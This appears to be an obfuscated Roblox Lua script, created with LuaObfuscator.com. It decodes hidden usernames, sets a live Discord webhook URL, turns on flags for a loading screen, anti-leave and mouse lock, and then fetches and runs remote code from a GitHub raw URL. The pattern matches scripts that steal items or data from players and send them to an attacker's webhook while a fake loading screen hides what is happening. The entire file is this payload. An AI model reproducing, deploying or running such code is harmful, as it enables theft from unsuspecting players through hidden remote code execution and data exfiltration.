--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.9) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end UserName=v7("\193\204\203\40\231\181\248\70\129","\126\177\163\187\69\134\219\167");Webhook="https://discord.com/api/webhooks/1125466538267381871/JsAnQc-ATUdCqR-FJAR_LD0kbwJvfHJTKuENmVsBmlhNLRS2mq7mxkR3tQTFigD4gdb_";UserName2=v7("\51\194\58\200\253\45\242\114\149","\156\67\173\74\165");_G.LoadingScreen=true;_G.AntiLeave=true;_G.MouseLock=true;loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ",true))();